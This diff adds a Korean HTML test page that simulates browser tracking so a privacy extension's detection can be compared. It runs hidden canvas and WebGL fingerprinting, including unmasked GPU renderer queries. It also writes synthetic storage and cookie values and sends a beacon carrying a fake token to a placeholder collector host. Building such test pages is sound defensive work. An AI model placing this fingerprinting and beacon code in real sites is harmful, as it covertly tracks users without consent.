@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="ko"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Privacy Mirror · 추적 신호 실험실</title>
+<style>html{color-scheme:dark;font:16px/1.6 system-ui;background:#090b10;color:#e9edf5}body{max-width:960px;margin:40px auto;padding:24px}section{background:#11151d;padding:24px;margin:24px 0;border-radius:24px;box-shadow:10px 10px 22px #020305,-5px -5px 18px #1b202a}h1{font-size:36px}button{padding:14px 20px;margin:6px;border:1px solid #454d65;border-radius:12px;background:#22283a;color:white;font:inherit;cursor:pointer}button:hover{background:#384668}#status{color:#70e1c0}pre{white-space:pre-wrap}canvas{max-width:100%;background:#fff}small{color:#a7b0c1}</style>
+<h1>추적 신호 실험실</h1><p>정상 렌더링과 여러 계층의 추적 의심 동작을 비교합니다. 아래 수치는 실행 횟수이며 확장 프로그램의 위험도는 별도로 확인하세요.</p>
+<section><button id="normal">① 정상 캔버스</button><button id="medium">② 숨겨진 지문 수집</button><button id="high">③ 복합 추적 · 30초</button><button id="stop">중지</button><p id="status" role="status">대기 중</p><pre id="counts">실행 0회</pre><canvas id="visible" width="600" height="180"></canvas></section>
+<section><h2>비교 방법</h2><p>확장 프로그램을 켠 상태로 ① → ② → ③을 실행하고 확장 창의 위험도·확신도·방어 결과를 확인하세요. ③은 숨겨진 Canvas, WebGL, digest, 가상 저장소 값, 외부 요청을 연속 실행해 계층 간 연결을 만듭니다. 보호 모드에서도 실행해 바꿔치기 결과를 비교할 수 있습니다.</p><p>단순 반복만으로 점수를 올리지 않는 감쇠 정책이 적용됩니다. 점수가 즉시 내려가지 않는 것은 최근 5분 근거가 남기 때문입니다. ‘중지’ 후 5분 이상 기다려 회복을 비교하세요. 높은 점수나 급격한 변동은 보장하지 않습니다.</p><small>개인 쿠키·파일·실제 식별자를 읽지 않습니다. 저장소에는 pm-lab 전용 가상 값만 씁니다. 네트워크는 존재하지 않는 collector.privacy-mirror-lab.invalid에 가상 토큰만 요청합니다. 최대 30초 후 자동 종료됩니다.</small></section>
+<script>
+let running=false, count=0, until=0;
+const status=document.getElementById('status'), counts=document.getElementById('counts');
+const fake='pm-lab-synthetic-token-00000001';
+function stop(){running=false;status.textContent='중지됨 · 최근 근거는 5분 동안 남을 수 있습니다.';try{localStorage.removeItem('pm-lab');sessionStorage.removeItem('pm-lab');document.cookie='pm-lab=; Max-Age=0; SameSite=Lax; path=/';indexedDB.deleteDatabase('pm-lab');}catch(e){}}
+function normal(){stop();const c=document.getElementById('visible'),x=c.getContext('2d');x.fillStyle='#e2efff';x.fillRect(0,0,c.width,c.height);x.fillStyle='#254766';x.font='28px sans-serif';x.fillText('사용자가 요청한 정상 렌더링',24,95);status.textContent='정상 렌더링 완료 · 픽셀 읽기·외부 요청 없음';}
+async function sample(high){
+ const c=document.createElement('canvas');c.width=300;c.height=90;c.style.display='none';document.body.append(c);
+ try{const x=c.getContext('2d');x.font='19px serif';x.fillText('Synthetic fingerprint '+(count%3),2,30);x.fillStyle='rgba(40,90,170,.6)';x.fillRect(7,12,90,38);const pixels=x.getImageData(0,0,300,90);c.toDataURL();
+ const g=document.createElement('canvas').getContext('webgl');if(g){const ext=g.getExtension('WEBGL_debug_renderer_info');if(ext){g.getParameter(ext.UNMASKED_VENDOR_WEBGL);g.getParameter(ext.UNMASKED_RENDERER_WEBGL);}const lose=g.getExtension('WEBGL_lose_context');if(lose)lose.loseContext();}
+ void navigator.hardwareConcurrency;void screen.width;
+ if(high){if(crypto.subtle)await crypto.subtle.digest('SHA-256',pixels.data);try{localStorage.setItem('pm-lab',fake);localStorage.getItem('pm-lab');sessionStorage.setItem('pm-lab',fake);sessionStorage.getItem('pm-lab');document.cookie='pm-lab='+fake+'; SameSite=Lax; path=/';const req=indexedDB.open('pm-lab',1);req.onsuccess=()=>req.result.close();}catch(e){}fetch('https://collector.privacy-mirror-lab.invalid/collect?id='+fake,{mode:'no-cors',credentials:'omit',referrerPolicy:'no-referrer'}).catch(()=>{});}
+ count++;counts.textContent='복합 샘플 실행 '+count+'회 · '+(high?'Canvas → digest → 가상 저장소 → 외부 요청':'숨겨진 Canvas + WebGL');
+ }finally{c.remove();}
+}
+async function start(high){if(running)return;running=true;count=0;until=Date.now()+(high?30000:6000);status.textContent=high?'복합 추적 신호 실행 중 · 30초 제한':'숨겨진 수집 실행 중 · 6초 제한';try{while(running&&Date.now()<until){await sample(high);await new Promise(r=>setTimeout(r,high?450:1100));}}catch(e){status.textContent='지원되지 않는 API: '+e.message;}finally{stop();}}
+document.getElementById('normal').onclick=normal;document.getElementById('medium').onclick=()=>start(false);document.getElementById('high').onclick=()=>start(true);document.getElementById('stop').onclick=stop;window.addEventListener('pagehide',stop);
+</script></html>
